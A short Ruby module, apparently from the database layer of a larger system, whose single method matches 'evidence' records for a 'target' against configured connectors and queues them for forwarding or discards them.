require 'rcs-common/trace'
require_relative 'db_objects/connector_queue'

module RCS
  module DB
    module ConnectorManager
      extend RCS::Tracer

      # If the evidence match some connectors, adds that evidence and that
      # collectors to the CollectorQueue.
      def self.process_evidence(target, evidence)
        matched_connectors = ::Connector.matching(evidence)
        return :keep if matched_connectors.blank?

        connector_queue = ConnectorQueue.push_evidence(matched_connectors, target, evidence)

        connector_queue.keep? ? :keep : :discard
      end
    end
  end
end
